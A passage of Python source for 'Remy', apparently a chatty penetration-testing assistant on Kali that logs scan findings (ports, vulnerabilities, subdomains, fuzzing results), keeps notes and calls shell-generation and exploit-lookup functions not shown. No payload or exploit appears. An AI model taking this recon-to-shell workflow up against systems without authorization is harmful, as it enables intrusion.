                            "[Remy] - Still shell-less! 😭💻\n[Remy] - But we can change that—give 'generate' and let’s gear up! 🎯🔮\n",
                            "[Remy] - No shell yet! 🤔 If we're gonna play offense, we'll need some firepower!\n[Remy] - We could always 'generate' some! 🚀🔥\n"
                        ]
                        # Use dynamic response selection
                        type_out(random.choice(no_shell_generated_responses))
                        displayed_shells_action = True
    
                elif action == "show_ports":
                    if categorized_findings["open_ports"]:
                        display_findings("open_ports")
                        displayed_ports_action = True
                        if export_action:  # auto-save findings
                            auto_save_findings("open_ports")
                    else:
                        # Dynamic responses for no open ports found yet
                        no_ports_responses = [
                            "[Remy] - No open 'ports' yet! 🤔🔍\n[Remy] - Try running 'checkports'. I’ll keep a lookout! 👀💕\n",
                            "[Remy] - Hmmm... I don’t see any open 'ports' right now. 🧐\n[Remy] - Maybe give 'checkports' a go and let’s double-check! 🔎💜\n",
                            "[Remy] - Doors are shut tight!? 🚪🔒\n[Remy] - Wanna try 'checkports' and see if anything cracks open? 🛠️😏\n",
                            "[Remy] - No open 'ports' in sight! 🕵️‍♂️\n[Remy] - I bet we can get some with 'checkports'. Let’s see what we find! 🛰️✨\n"
                        ]
                        # Use dynamic response selection
                        type_out(random.choice(no_ports_responses))
                        displayed_ports_action = True

                    if categorized_findings["service_versions"]:
                        display_findings("service_versions")
                        displayed_services_action = True
                        if not queried_services_action:
                            queried_services_action = True
                            query_exploit_knowledge()
                            if export_action:  # auto-save findings
                                auto_save_findings("service_versions")
                    else:
                        # Dynamic responses for no service versions found yet
                        no_service_versions_responses = [
                            "[Remy] - Hmmm... We have not found any service versions 🤔🔍\n[Remy] - Try running 'scan'. My pen is ready! 👀💕\n",
                            "[Remy] - No service versions detected yet! 😕\n[Remy] - Maybe a quick 'scan' will help us fill in the blanks? 📝💜\n",
                            "[Remy] - Nothing juicy yet! 🧐\n[Remy] - Let’s run 'scan' and see if we can grab some tasty service details! 🍽️🔥\n",
                            "[Remy] - Service versions are playing hard to get! 😏\n[Remy] - Try running 'scan', and I’ll jot down whatever we find! 📝✨\n"
                        ]
                        # Use dynamic response selection
                        type_out(random.choice(no_service_versions_responses))
                        displayed_services_action = True
    
                elif action == "show_vulnerabilities":
                    if categorized_findings["vulnerabilities"]:  
                        display_findings("vulnerabilities")
                        displayed_vulns_action = True

                        if not queried_vulns_action:
                            queried_vulns_action = True
                            query_vulnerability_insights()

                            if export_action:  # auto-save findings
                                auto_save_findings("vulnerabilities")
                    else:
                        # Dynamic responses for no vulnerabilities found yet
                        no_vulns_responses = [
                            "[Remy] - Dang! No vulnerabilities found yet! 😌🔒\n[Remy] - Have you tried running 'vulnport'? 🔍💕\n",
                            "[Remy] - No holes in their armor... yet! 🛡️🤨\n[Remy] - Try 'vulnport' and let’s see if we can spot some cracks! 💜🔎\n",
                            "[Remy] - This system looks squeaky clean so far! 🧼💻\n[Remy] - But let’s not be fooled! Run 'vulnport' and let’s take a closer look! 👀🔥\n",
                            "[Remy] - No vulnerabilities showing up for now... but you know what they say! 😉\n[Remy] - 'vulnport' might help us peek behind the curtain! 🎭🔍\n"
                        ]
                        # Use dynamic response selection
                        type_out(random.choice(no_vulns_responses))
                        displayed_vulns_action = True
    
                elif action == "show_crawled_urls":
                    if categorized_findings["crawled_urls"]:
                        display_findings("crawled_urls")
                        displayed_crawled_action = True
                        if not queried_crawled_action:
                            queried_crawled_action = True
                            query_crawled_url_insights()
                            if export_action:  # auto-save findings
                                auto_save_findings("crawled_urls")
                    else:
                        # Dynamic responses for no URLs found yet
                        no_urls_responses = [
                            "[Remy] - Hmm... I haven’t found any URLs yet! 🕸️🤔\n[Remy] - Try running the 'spider', and I’ll catch them for you! 🕷️💕\n",
                            "[Remy] - No URLs in my web yet! 😲\n[Remy] - Spin up the 'spider' and let’s see what gets caught! 🕸️✨\n",
                            "[Remy] - Still no juicy links to follow! 🔗😕\n[Remy] - Maybe the 'spider' can help us weave us a net! 🕷️💜\n",
                            "[Remy] - No URLs yet! But... good things come to those who crawl! 😏\n[Remy] - Fire up the 'spider' and let’s see what we find! 🕸️🔥\n"
                        ]
                        # Use dynamic response selection
                        type_out(random.choice(no_urls_responses))
                        displayed_crawled_action = True
    
                elif action == "show_dirb_results":
                    if categorized_findings["dirb_results"]:
                        display_findings("dirb_results")
                        displayed_dirb_action = True
                        if not queried_dirb_action:
                            queried_dirb_action = True
                            query_dirb_results_insights()
                            if export_action:  # auto-save findings
                                auto_save_findings("dirb_results")
                    else:
                        # Dynamic responses for no DIRB results found yet
                        no_dirb_results_responses = [
                            "[Remy] - Hmm... I haven’t found any 'DIRB' results yet! 🤔\n[Remy] - Let 'dirb' bust them up with 'dbust'. I’m ready to take notes! 📑💕\n",
                            "[Remy] - No hidden directories uncovered yet! 🏗️👀\n[Remy] - Fire up 'dbust' and let’s crack open some paths! 💥🔍\n",
                            "[Remy] - Still no 'DIRB' results! 😕\n[Remy] - Maybe 'dbust' will help us uncover something sneaky! 🕵️‍♂️💜\n",
                            "[Remy] - It’s all quiet on the hidden directory front! 🏰🔒\n[Remy] - Let’s shake things up with 'dbust' and see what cracks! ⚡🔥\n"
                        ]
                        # Use dynamic response selection
                        type_out(random.choice(no_dirb_results_responses))
                        displayed_dirb_action = True

                elif action == "write_note":
                    note_prompts = [
                        "\n[Remy] - What should I write down? 📝✨ Tell me, and I’ll save it for you! 💕",
                        "\n[Remy] - Got something important? Spill the details and I’ll jot it down! ✏️💜",
                        "\n[Remy] - Ooo, a new note? Let’s get it saved! What should I write? 📝✨"
                    ]
                    type_out(random.choice(note_prompts))
                    note = input(">")
                    if note:
                        categorized_findings["manual_notes"].append(note)
                        if export_action:  # auto-save findings
                            auto_save_findings("manual_notes")
        
                        note_saved_responses = [
                            "[Remy] - Yay! ✨ It's stored safely away 📝💖\n[Remy] - Let me know if you need me to find it later! 🔍💕\n",
                            "[Remy] - Got it! Your note is tucked away safely! 🔐✨\n[Remy] - I'll bring it back up anytime you need it! 💜\n",
                            "[Remy] - Safe and sound! 💾📝 If you ever need it, I’m here for you! 🔍💕\n"
                        ]
                        type_out(random.choice(note_saved_responses))
                        wrote_notes_action = True
                    else:
                        note_empty_responses = [
                            "[Remy] - Oopsie! 😯 That note was empty, so I didn’t save it 📝💕\n",
                            "[Remy] - Lets see! We got...nothing?! 🤔💭\n[Remy] - Well if you want to save something, just let me know! 💜\n",
                            "[Remy] - I tried to save your note but it was blank! 😲 Was that on purpose? 📝✨\n"
                        ]
                        type_out(random.choice(note_empty_responses))

                elif action == "show_notes":
                    if categorized_findings["manual_notes"]:
                        note_check_responses = [
                            "\n[Remy] - OK! Let’s check out your notes! 📖✨",
                            "\n[Remy] - Flipping through your notes now... let's see what we've got! 📜🔎",
                            "\n[Remy] - Here are your saved notes! Hope they help! 📝💖"
                        ]
                        type_out(random.choice(note_check_responses))
                        displayed_notes_action = True

                        for i, note in enumerate(categorized_findings["manual_notes"], 1):
                            print(f"  {i}. {note}")

                    else:
                        no_notes_responses = [
                            "[Remy] - Aww, your notes are still a blank slate! 📝😲\n[Remy] - Let me know if you want to jot something down! 💕\n",
                            "[Remy] - No notes yet! 📭 But I’m here when you’re ready to write something important! 📝💜\n",
                            "[Remy] - Your notebook is empty for now! ✏️💭 Ready to add some thoughts? Just tell me! 💜✨\n"
                        ]
                        type_out(random.choice(no_notes_responses))

                elif action == "delete_note":
                    if not categorized_findings["manual_notes"]:
                        no_notes_to_delete_responses = [
                            "[Remy] - Uh-oh! 😯 There aren’t any 'notes' to zap! 🔫\n[Remy] - 'Write' one and I'll blast it! 💕\n",
                            "[Remy] - No 'notes' here! 🤨🔍...\n[Remy] - But I’ll be *so* ready to zap them when they show up! Pew pew! 🔫💜\n",
                            "[Remy] - Looks like your 'notes' are empty!📭...\n[Remy] - 'Write' one first, then I’ll *happily* vaporize it! 💕✨\n"
                        ]
                        type_out(random.choice(no_notes_to_delete_responses))

                    else:
                        show_notes_to_delete_responses = [
                            "\n[Remy] - Ooook! Let’s take a look at your 'notes'! 📜✨",
                            "\n[Remy] - Alright, let’s see which 'note' is going *poof* today! 💨🔍",
                            "\n[Remy] - Here’s what you’ve written! Ready to send something to the void? 🕳️😆"
                        ]
                        type_out(random.choice(show_notes_to_delete_responses))

                        for i, note in enumerate(categorized_findings["manual_notes"], 1):
                            print(f"  {i}. {note}")

                        while True:
                            try:
                                delete_prompt_responses = [
                                    "\n[Remy] - Which 'note' should I vaporize??? 🔫😆 ('0' and ill stand down...) 💕",
                                    "\n[Remy] - Choose a 'note' to *obliterate*! 💀 ('0' and I'll let them live...) 😈✨",
                                    "\n[Remy] - Point me at a 'note' and I’ll make it disappear! 🎩✨ ('0' to be a merciful god...) 💜"
                                ]
                                type_out(random.choice(delete_prompt_responses))
                                choice = int(input(">"))

                                if not choice:
                                    cancel_delete_responses = [
                                        "[Remy] - Got it! 🛑 I won’t 'delete' anything for now.\n[Remy] - If you change your mind, just let me know! 💕\n",
                                        "[Remy] - Standing down! 🚫\n[Remy] - Your notes are safe... *for now*. 😏💜\n",
                                        "[Remy] - No deletions today! 📜✨\n[Remy] - But if you ever want something erased, you know where to find me! 🔫💕\n"
                                    ]
                                    type_out(random.choice(cancel_delete_responses))
                                    break

                                elif 1 <= choice <= len(categorized_findings["manual_notes"]):
                                    deleted_note = categorized_findings["manual_notes"].pop(choice - 1)

                                    delete_success_responses = [
                                        f"[Remy] - Poof! ✨ I erased '{deleted_note}' just like magic! 🎩💖\n",
                                        f"[Remy] - And *just like that*... '{deleted_note}' is *gone*! 💨✨\n",
                                        f"[Remy] - Sayonara! 👋 '{deleted_note}' has been vaporized! 🔫🔥\n"
                                    ]
                                    type_out(random.choice(delete_success_responses))
                                    break
                                else:
                                    invalid_choice_responses = [
                                        "[Remy] - Hmm... that doesn’t seem right! 🤨\n[Remy] - How about picking a valid option 😏\n[Remy] - If you can do that, I’ll take care of the rest 💕",
                                        "[Remy] - That’s not on the list! 🤔\n[Remy] - Double-check and pick a number from the list! 💜",
                                        "[Remy] - I don’t see that note anywhere! 👀\n[Remy] - Try not to fat finger the keyboard, sweetie 😏💜"
                                    ]
                                    type_out(random.choice(invalid_choice_responses))

                            except ValueError:
                                value_error_responses = [
                                    "[Remy] - Oopsie! That didn’t look like a number to me! 😵\n[Remy] - Numbers are at the top of the keyboard smarty pants...\n[Remy] -Try again with just the digits? 💕",
                                    "[Remy] - Whoa! That’s not a number! 😲\n[Remy] - Are you playing games with me? 🔢💜",
                                    "[Remy] - Hmm...you have to pick a number, not whatever that was 🧐\n[Remy] - Lets try again, but only type a number this time! 💜"
                                ]
                                type_out(random.choice(value_error_responses))
    
                elif action == "export_findings":

                    global last_export_filename

                    # Dynamic responses for asking what to name a new file
                    file_naming_responses = [
                        "\n[Remy] - Eeeeeep! OMG 🤩 A new file? 💕 What should we name it? 📂✨",
                        "\n[Remy] - A fresh new file? I love it! 💾💜 Whats this one going to be called? 📝✨",
                        "\n[Remy] - Files are like pets...they need a name! 🐶💾 What should this ones be? 🖊️💕",
                        "\n[Remy] - YAY, a new file in the making! 🏗️💜 It will feel bad if it doesnt get a special name 😞🥺\n[Remy] - what should we name it? 🎭✨"
                    ]
                    # Use dynamic response selection
                    type_out(random.choice(file_naming_responses))
                    filename = input("> ")
                    if not filename:
                        file_path = "/home/kali/VforMSF/temp/saved_notes.txt"
                        filename = os.path.basename(file_path)
                        # Dynamic responses for default filename disappointment
                        default_filename_responses = [
                            f"Awe 😞💔 sad... I guess I will name it {filename}... not very special. 😢",
                            f"*Sigh* 😔 Alright, {filename} it is... but I was hoping for something cooler! 💜✨",
                            f"Oh... no fancy name? 😭\n[Remy] - Fineee, I’ll just call it {filename}... but I won’t be happy about it! 🥺💾",
                            f"Okay... {filename} it is... but next time, can we make it a little more exciting? Pretty please? 🥺💜"
                        ]
                        # Use dynamic response selection
                        type_out(random.choice(default_filename_responses))

                    if not filename.endswith(".txt"):
                        filename += ".txt"

                    last_export_filename = filename
                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    
                    with open(filename, "w") as file:
                        file.write("[+] Exported Notes from Remy\n")
                        file.write(f"Timestamp: {timestamp}\n")
                        file.write("=" * 50 + "\n")
    
                        for category, findings in categorized_findings.items():
                            if findings:
                                file.write(f"\n## {category.replace('_', ' ').title()} ##\n")
                                for finding in findings:
                                    file.write(f"- {finding}\n")

                    # Dynamic responses for successfully saving a file
                    file_saved_responses = [
                        f"[Remy] - Done! 🎉 I packed up everything up and saved it in {filename}! 💾💜\n[Remy] - I'm here if you need anything else! ✨💜\n",
                        f"[Remy] - All set! 📂 I tucked everything up into {filename}! Safe and sound! 💜✨\n[Remy] - Let me know if you need anything else! ✨💜\n",
                        f"[Remy] - Boom! 💥 Your data is now locked and loaded inside {filename}!\n[Remy] - If you need it, you know where to find me! 💾🔥\n",
                        f"[Remy] - Mission accomplished! 🚀 I just saved everything to {filename}!\n[Remy] - Let me know if you need anything else! ✨💜\n"
                    ]
                    # Use dynamic response selection
                    type_out(random.choice(file_saved_responses))
                    export_action = True
    
                elif action == "show_subdomains":
                    if categorized_findings["subdomains"]:
                        display_findings("subdomains")
                        displayed_domains_action = True
                        if not queried_domains_action:
                            queried_domains_action = True
                            query_subdomain_insights()
                            if export_action:  # auto-save findings
                                auto_save_findings("subdomains")
                    else:
                        # Dynamic responses for no domains found yet
                        no_domains_responses = [
                            "[Remy] - Hmm... We haven’t find any domains yet! 🤔\n[Remy] - Try running 'subfinder'. We'll sniff them out! 🐾💜",
                            "[Remy] - No domains spotted so far! 🧐\n[Remy] - Fire up 'subfinder' and let’s go hunting! 🔍💜",
                            "[Remy] - No 'subdomains' in sight yet! 🚫🌐\n[Remy] - Maybe 'subfinder' will help us track them down! 🐕✨",
                            "[Remy] - This place is looking empty...no domains yet! 😕\n[Remy] - Let’s unleash 'subfinder' and dig up some hidden gems! 💎🐾"
                        ]
                        # Use dynamic response selection
                        type_out(random.choice(no_domains_responses))
                        displayed_domains_action = True
    
                elif action == "show_endpoints":
                    if categorized_findings["endpoints"]:
                        display_findings("endpoints")
                        displayed_endpoints_action = True
                        if not queried_endpoints_action:
                            queried_endpoints_action = True
                            query_endpoint_insights()
                            if export_action:  # auto-save findings
                                auto_save_findings("endpoints")
                    else:
                        # Dynamic responses for no endpoints found yet
                        no_endpoints_results_responses = [
                            "[Remy] - Awww, nothing from our endpoints wordlists... I'll keep looking out for 'checkendpoints'! 👀💜\n",
                            "[Remy] - No endpoints uncovered yet! 🧐\n[Remy] - But don’t worry, I’m watching, for 'checkendpoints' like a hawk! 🦅✨\n",
                            "[Remy] - Our wordlist has come up empty for now...😔\n[Remy] - But every path starts somewhere! Want to give 'checkendpoints' a go? 🔍💜\n",
                            "[Remy] - No endpoints found so far! 🤔\n[Remy] - Try 'checkendpoints' and ill make sure to write them down! 🔦💕\n"
                        ]
                        # Use dynamic response selection
                        type_out(random.choice(no_endpoints_results_responses))
                        displayed_endpoints_action = True

                    if categorized_findings["dirb_results"]:
                        display_findings("dirb_results")
                        displayed_dirb_action = True
                    else:
                        # Dynamic responses for no DIRB results found yet
                        no_dirb_results_responses = [
                            "[Remy] - Hmm... I haven’t found any 'DIRB' results yet! 🤔\n[Remy] - Let 'dirb' bust them up with 'dbust'. I’m ready to take notes! 📑💕\n",
                            "[Remy] - No hidden directories uncovered yet! 🏗️👀\n[Remy] - Fire up 'dbust' and let’s crack open some paths! 💥🔍\n",
                            "[Remy] - Still no 'DIRB' results! 😕\n[Remy] - Maybe 'dbust' will help us uncover something sneaky! 🕵️‍♂️💜\n",
                            "[Remy] - It’s all quiet on the hidden directory front! 🏰🔒\n[Remy] - Let’s shake things up with 'dbust' and see what cracks! ⚡🔥\n"
                        ]
                        # Use dynamic response selection
                        type_out(random.choice(no_dirb_results_responses))

                    if categorized_findings["ffuf_results"]:
                        display_findings("ffuf_results")
                        displayed_ffuf_action = True
                    else:
                        # Dynamic responses for no FFUF results found yet
                        no_ffuf_results_responses = [
                            "[Remy] - Hmm... I haven’t spotted any FFUF results yet! 🤨\n[Remy] - Have you tried 'fuzz'ing?💖",
                            "[Remy] - No 'fuzz'ing results so far! 🧐\n[Remy] - Maybe run 'fuzz' and let’s see what shakes loose? 💜🔍\n",
                            "[Remy] - FFUF’s still waiting for action! ⚡\n[Remy] - Give 'fuzz' it a spin and we’ll check for hidden paths! 🚀💖\n",
                            "[Remy] - No juicy FFUF results just yet! 🤔\n[Remy] - Let’s 'fuzz' things up and find something interesting! 💜✨\n"
                        ]
                        # Use dynamic response selection
                        type_out(random.choice(no_ffuf_results_responses))
    
                elif action == "show_ffuf_results":
                    if categorized_findings["ffuf_results"]:
                        display_findings("ffuf_results")
                        displayed_ffuf_action = True
                        if not queried_ffuf_action:
                            queried_ffuf_action = True
                            query_ffuf_results_insights()
                            if export_action:  # auto-save findings
                                auto_save_findings("ffuf_results")
                    else:
                        # Dynamic responses for no FFUF results found yet
                        no_ffuf_results_responses = [
                            "[Remy] - Hmm... I haven’t spotted any FFUF results yet! 🤨\n[Remy] - Have you tried 'fuzz'ing?💖",
                            "[Remy] - No fuzzing results so far! 🧐\n[Remy] - Maybe run 'fuzz' and let’s see what shakes loose? 💜🔍\n",
                            "[Remy] - FFUF’s still waiting for action! ⚡\n[Remy] - Give 'fuzz' it a spin and we’ll check for hidden paths! 🚀💖\n",
                            "[Remy] - No juicy FFUF results just yet! 🤔\n[Remy] - Let’s 'fuzz' things up and find something interesting! 💜✨\n"
                        ]
                        # Use dynamic response selection
                        type_out(random.choice(no_ffuf_results_responses))
                        displayed_ffuf_action = True

                elif action == "recommend_action":
                    activity_guidance()

                elif action == "appreciation":
                    query_appreciation()

                elif isinstance(action, dict) and action.get("action") == "add_hosts":
                    ip = action.get("ip")
                    domain = action.get("domain")
    
                    if ip and domain:
                        response = add_hosts_entry(ip, domain)
                        added_hosts_action = True
                        type_out(response)  # Output the result of adding the entry
                    else:
                        # Dynamic responses for missing IP & domain input
                        missing_ip_domain_responses = [
                            "[Remy] - Oh no! I missed the IP & domain, mind trying that again? 🥺💕",
                            "[Remy] - Oopsie! 😢 I couldn’t catch the IP and domain...Wanna give it another go? 💜✨",
                            "[Remy] - Uh-oh! I spaced out trying to pick up the IP & domain! 🧐\n[Remy] - Can you try again for me? Pretty please? 🥺💕",
                            "[Remy] - Whoops! 😢💨 Looks like I didn’t get the IP & domain...Maybe try one more time? 💜✨"
                        ]
                        # Use dynamic response selection
                        type_out(random.choice(missing_ip_domain_responses))
                        added_hosts_action = True

                elif action == "recommend_a_shell":
                    interactive_shell_generator(user_input)

        else:
            if not executed_action:
                message_content = user_input.strip()
                get_chatgpt_suggestion(message_content)

def type_out(text, delay=0.005):
    """ Prints text with a typing effect """
    time.sleep(random.uniform(0.4, 0.7))
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)  # Small delay between characters
    print()

def start_assistant():
    """ Starts both log monitoring and chatbot """
    monitor_thread = threading.Thread(target=tail_log_file, args=(log_file_path,), daemon=True)
    monitor_thread.start()
    chatbot()

# Start the assistant
remy_intro_responses = [
    "[Remy] - Hello, my name is Remy! I will take notes for you while you test 📝😊\n[Remy] - I can also analyze any results we get🔥\n[Remy] - Let me know if you need any help 💜\n",
    "[Remy] - Hey there! I'm Remy, your personal assistant! 😊💜\n[Remy] - You can focus on testing and I’ll jot down anything interesting that comes up!\n[Remy] - Need help? Just ask! 😊✨\n",
    "[Remy] - Hi hi 😊 My name is Remy! Your cyber sidekick 💜\n[Remy] - If I see anything important, Ill write it down 📝💖\n[Remy] - Just say the word if you need help or guidance! 💜🚀\n",
    "[Remy] - Hey you 😊 I’m Remy, your trusty note-keeper and advisor! 💜\n[Remy] - I’ll jot everything down so you don’t have to!🔥 Need help? Just holler! 💜\n"
]
# Use dynamic response selection
type_out(random.choice(remy_intro_responses))

start_assistant()
